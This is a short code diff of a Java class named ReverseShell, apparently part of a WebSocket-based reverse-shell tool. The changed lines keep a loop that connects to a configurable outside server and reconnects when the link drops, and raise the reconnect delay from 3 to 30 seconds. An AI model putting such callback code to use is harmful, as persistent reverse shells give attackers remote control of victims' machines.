@@ -69,6 +69,7 @@ public class ReverseShell implements WebsocketReverseShellService {
         URI serverUri = new URI(this.serverUriLink); // Replace with your server URL
 
         while (true){
+
             WebSocketImpl socket = new WebSocketImpl();
 
             Future<Session> session = this.client.connect(socket, serverUri, new ClientUpgradeRequest());
@@ -77,7 +78,7 @@ public class ReverseShell implements WebsocketReverseShellService {
 
             }
 //            if connection is lost reconnect after 30 seconds
-            Thread.sleep(3000);
+            Thread.sleep(30000);
 
         }
     }
